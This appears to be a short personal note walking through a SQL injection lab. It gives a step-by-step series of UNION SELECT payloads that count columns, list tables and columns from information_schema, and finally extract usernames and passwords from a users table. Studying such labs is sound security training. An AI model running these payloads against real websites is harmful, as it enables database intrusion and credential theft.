First step, as usual we need to find how many column. 
. `'+UNION+SELECT+'abc','def'--`

Next, we need to use this command to get the tables
. `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
We will receive this answer with all the tables. We will able to see one table called user_something
![[Pasted image 20250626223012.png]]

When we made the query with the table's name given, the db will return us two tables, username and password something.
1. `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_dogjtb'--`

![[Pasted image 20250626223220.png]]

Finally, we have all the information that we need to build our last query.
1. `'+UNION+SELECT+username_zbevlj,+password_apodjq+FROM+users_dogjtb--`
![[Pasted image 20250626223718.png]]
